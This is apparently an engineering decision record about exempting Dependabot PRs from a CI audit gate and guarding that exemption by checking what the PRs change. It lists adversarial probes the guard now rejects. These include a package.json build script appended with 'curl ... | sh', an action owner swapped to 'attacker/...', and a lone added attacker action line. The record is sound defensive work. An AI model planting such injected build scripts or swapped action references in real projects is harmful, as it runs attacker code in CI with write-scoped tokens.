# The audit gate was red by construction for every Dependabot PR

`check_audit_evidence.py` requires a literal `## Adversarial audit` section in
the PR body. A Dependabot PR has a body Dependabot wrote, and nobody can edit it
into compliance without taking over authorship of the PR — so the required check
**"Adversarial audit recorded"** could never go green for that whole class.

The two exits without an exemption are both worse than one. Merging past a red
required check teaches that a red gate is negotiable, which is expensive for the
gates that are not. Closing the PR and redoing the bump by hand is how security
patches sit unmerged — and this repo already records what that costs, on the
`next` 15.5.24 RCE where "the container started" and "the patch is applied" read
identically.

## Measured before building, because an absent check is easy to assume

No `dependabot`, no `github.actor`, no `pull_request.user` and no author check
exists anywhere in `check_audit_evidence.py` or in any workflow. So this was not
a narrow gap — the gate had no concept of an author at all.

## Author-based, in the workflow, not in the script

The condition is an `if:` on the step. The workflow is the only place the author
is known: `check_audit_evidence.py` is handed a changed-file list and a body, and
giving it an identity would turn a text checker into an authorisation checker —
after which the next exemption goes there too, instead of where the author
actually is.

## It fails closed, and that is the property a future edit must preserve

`if: github.event.pull_request.user.login != 'dependabot[bot]'`

An **inequality**, so every author that is not that exact login runs the step —
including the `null` that `user.login` is on a payload carrying no
`pull_request`. An `==` inverts it: the step would run only for Dependabot,
exempting every human PR from the audit requirement. One character, in a
required gate, and CI stays green either way.

Three mutations, each applied to the workflow and run:

| mutation | result |
| --- | --- |
| `!=` → `==` | 1 test red |
| the `if:` deleted | 2 tests red |
| keyed on `github.actor` instead of the PR author | 1 test red |

`github.actor` is who triggered the run, which on a re-run is whoever clicked
it rather than the bot that opened the PR — so that third one is a plausible
edit rather than a contrived one.

## What this REMOVES, without a compensating control it does not have

The first version of this entry said a Dependabot PR "still needs
`gh pr review --approve` from a named human, which is branch protection and not
this gate". Measured 2026-09-22:

    gh api repos/{owner}/{repo}/branches/main/protection
      required_pull_request_reviews.required_approving_review_count  ->  0
      enforce_admins                                                ->  false

**Nothing enforces a review.** So this skip removes the only enforced check on
these PRs and leaves a convention in its place. That is probably the right trade
with four security updates stuck — but it has to be argued on those terms, not
on a control that exists only in a sentence. Corroborated from a second
direction: #468's blocker list names the audit gate and nothing else, and a
required review would be listed there too.

**Whether to turn a real review requirement on is a decision for the humans**,
and this entry does not imply an answer. Either the convention becomes a gate,
or the exemption is unguarded and that is recorded.

## The exemption is bounded by CONTENT as well as author

The skip is keyed on AUTHOR; its justification is about CONTENT. A maintainer can
push commits to a Dependabot branch — the routine case is a bump that breaks
something and a human fixing it in place — and `pull_request.user.login` stays
`dependabot[bot]`. So the exemption would follow the BRANCH, and arbitrary
human-authored code would merge with the required audit check green and no audit
block anywhere. That is the class #93/#94/#95 record putting a client-facing
fabricated gap on `main`, arriving through the one PR class nobody can edit.

`check_bot_pr_is_manifest_only.py` runs only for the exempted author and fails
when that PR touches anything the exemption was not written for.

### `.github/` is judged by CONTENT, and the first version got that wrong

It put `.github/workflows/*.yml` on the **path** allow-list, because the
github-actions updater legitimately rewrites workflows to bump `uses:` refs.
A path match cannot tell a ref bump from a rewrite of `audit-gate.yml` itself —
so a PR authored as the bot could have deleted the audit step it is exempt from
and passed. In the file class that controls every other gate, with
`enforce_admins` false and zero required reviews.

**Removing the glob was the wrong fix**, because #465 is the github-actions group
and would have re-broken. So every added or removed line in a `.github/` file
must be a `uses: <owner>/<repo>@<ref>` bump:

| input | exit |
| --- | --- |
| bot + `audit-gate.yml` with the audit step deleted | **1**, quoting the line |
| bot + workflow, every changed line a `uses:` bump | **0** |
| bot + `uses: ./.github/actions/something-else` | **1** — local code is not a dependency |
| `.github/` touched and no `--diff` given | **2** |
| `.github/` path in the list, absent from the diff | **2** |

## VALIDATED FOR RESTRICTION, and the first attempt only did coverage

The first run checked all four bot PRs and reported every one clean. That
establishes the allow-list is **wide enough**. It says nothing about whether it
is **narrow enough** — and #465 passed *precisely because* workflows were
permitted, so the run meant to validate the guard exercised the dangerous case
and recorded it as a pass.

**An allow-list validated only against benign traffic is certified for coverage,
never for restriction.** That is the same defect as sampling mutations only from
inside the region the tests already cover: both produce a confident green from a
population that could not have gone red.

**And the first version of THIS SECTION committed the same error it names.**
Its whole evidence for "restriction" was one planted `continue-on-error` line —
which is not a `uses:` line at all, so it sits entirely **outside** the admitted
language. It established that the guard refuses obviously foreign content. It
never tested whether the admitted language is narrow, which is the only question
that matters. Adversarial review found three real holes living inside it, and all
three measured **exit 0**.

Six probes, measured 2026-09-23, three of them attacks the first guard passed:

    all four real bot PRs, real diffs                    -> exit 0
    a real `uses:` bump PAIR (-@v4 / +@v7)               -> exit 0
    a real dependency bump in a package.json             -> exit 0
    OWNER SWAP  -gitleaks/... / +attacker/...            -> exit 1   (was 0)
    LONE ADDED  +uses: attacker/action@v1, no removal    -> exit 1   (was 0)
    package.json "build": "next build && curl ... | sh"  -> exit 1   (was 0)
    a content-judged path with no --diff                 -> exit 2
    a `.github/` diff with ZERO changed content lines    -> exit 2

Two mechanisms behind the three zeros.

**A bump is a PAIR, and the regex checked a line SHAPE.** Same `owner/repo`
removed and added, with different refs — a property of the whole hunk, which no
single-line pattern can express. So an owner swap matched twice and a lone added
step matched once, and both read as "every changed line is a `uses:` bump".
`ci.yml`'s gitleaks step is exactly the shape: swapping only the owner leaves its
`env:` block out of the diff entirely, and the job carries `pull-requests: write`.
Dependabot's token is read-only while the PR is open, so the escalation is that
the line **merges**, after which every human-triggered run executes it with the
full token.

**`package.json` was judged by PATH**, under "a dependency manifest has no
authority over anything except which versions install". `ci.yml` falsifies that: it
runs `format:check`, `lint`, `typecheck`, `test` and `build`, every one a script
defined in a `package.json`. A commit on a bot branch turning `"build": "next
build"` into `"next build && …"` kept `user.login == dependabot[bot]` and passed.

**The lesson generalises past this guard, and it is the third instance of one
root.** Sampling mutations only from inside the covered region; validating an
allow-list only against benign traffic; and — on #209 the same night — seeding a
Postgres fixture with the one spelling the filter under test already agreed with.
All three are *a test whose input was chosen by the thing under test*. See D-084.

### What the four actually touch, by file rather than by category

Because "every one is manifests-only" was true and misleading at once:

    #465  .github/workflows/{audit-gate,mutation-sweep,scheduled-triggers}.yml
          -- every changed line a `uses:` bump, checked against the real diff
    #466  apps/api/pyproject.toml
    #467  apps/api/pyproject.toml
    #468  apps/web/package.json, package.json,
          packages/design-system/package.json, pnpm-lock.yaml

## LIVE, not latent — and this entry first said the opposite

It read "zero Dependabot PRs were open", which was **true when measured and
false within the hour**. Four arrived during the session and every one is
blocked on this exact check:

    #465  github-actions group      #467  anthropic requirement
    #466  ruff 0.16.3 -> 0.16.8     #468  npm-minor-patch group

<!-- counted: gh pr list --state open --author app/dependabot --json number | jq length -> 4, 2026-09-22 -->

A stuck queue you can name is a stronger justification than a hypothetical one,
and the stale figure is exactly why rule 2 says to carry the command rather than
the number. My first measurement was also the wrong shape — it filtered on a
login spelling that matched nothing and returned 0, which is the
selector-that-selects-nothing defect. `--author app/dependabot` is the form that
works.

## What my own test got wrong, caught by running it

Worth recording because both are shapes this repo keeps finding, and both were
cheaper to hit here than in a gate:

- It resolved the workflow with `parents[3]`, which is a claim about where the
  file sits relative to a **mount** — `apps/api` is mounted at `/app` for the
  lint gate and the whole tree at `/work` for a full-checkout run, so the same
  expression names two directories. It died with `FileNotFoundError`, loudly.
  Replaced by walking up for `.github/workflows`, which is what
  `check_disclosure_consumers.py::repo_root_for` already argues for.
- It asserted the script contains no `"author"`, and failed on three prose
  lines — "It proves the author RECORDED an audit", and two more. Every one is
  the English word and none is a check. An over-broad predicate producing a
  confident false positive, in the test written to catch over-broad matching.

## No D-number

The reasoning is at the site in `audit-gate.yml` and pinned by four tests, so a
`DECISIONS.md` entry would restate it without adding anything a reader of the
workflow does not already have. And D-082 is claimed by an unlanded branch, so
allocating past it would widen the sequence gap that D-078 already demonstrates
— a number claimed on a branch that never lands is a hole forever.
